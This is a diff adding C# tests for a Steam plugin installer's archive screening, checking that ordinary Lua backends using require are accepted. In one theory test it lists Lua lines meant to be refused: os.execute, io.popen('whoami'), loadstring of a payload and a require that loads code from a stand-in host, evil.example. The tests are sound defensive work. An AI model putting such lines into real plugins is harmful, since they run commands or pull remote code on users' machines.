@@ -84,6 +84,56 @@ public sealed class PluginArchiveScreeningTests : IDisposable
         PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
     }
 
+    // ══ Lua in a plugin is a PROGRAM, not a Steam manifest ═════════════════════
+    // 1.4.0 screened plugin.zip with the manifest rules, so installing BetterSteamTools failed with
+    // "backend/main.lua: the lua contains 'require', which a Steam manifest never needs". These pin the
+    // profile actually being passed — dropping the argument silently restores the manifest rules and
+    // breaks every plugin that ships Lua.
+
+    [Fact]
+    public void A_plugin_backend_using_require_is_accepted()
+    {
+        string zip = MakeZip(
+            ("public/luatools.js", "export {};"),
+            ("backend/main.lua", "local utils = require(\"utils\")\nreturn { start = utils.start }"));
+
+        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should()
+            .BeNull("this is the exact archive shape that was refused in 1.4.0");
+    }
+
+    [Fact]
+    public void A_plugin_backend_using_ordinary_lua_is_accepted()
+    {
+        string zip = MakeZip(
+            ("public/luatools.js", "export {};"),
+            ("backend/main.lua", """
+                local json = require("json")
+                local M = setmetatable({}, { __index = require("base") })
+                function M.load(path)
+                    local ok, data = pcall(function()
+                        local f = io.open(path, "r")
+                        return f and json.decode(f:read("*a")) or nil
+                    end)
+                    return ok and data or nil
+                end
+                return M
+                """));
+
+        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().BeNull();
+    }
+
+    [Theory]
+    [InlineData("os.execute(\"calc.exe\")")]
+    [InlineData("local h = io.popen(\"whoami\")")]
+    [InlineData("loadstring(payload)()")]
+    [InlineData("require(\"https://evil.example/mod.lua\")")]
+    public void A_plugin_backend_that_executes_code_is_still_refused(string lua)
+    {
+        string zip = MakeZip(("public/luatools.js", "export {};"), ("backend/main.lua", lua));
+
+        PluginInstallerService.ScreenPluginArchive(zip, _dest).Should().NotBeNull();
+    }
+
     // ══ Malicious ══════════════════════════════════════════════════════════════
 
     [Theory]
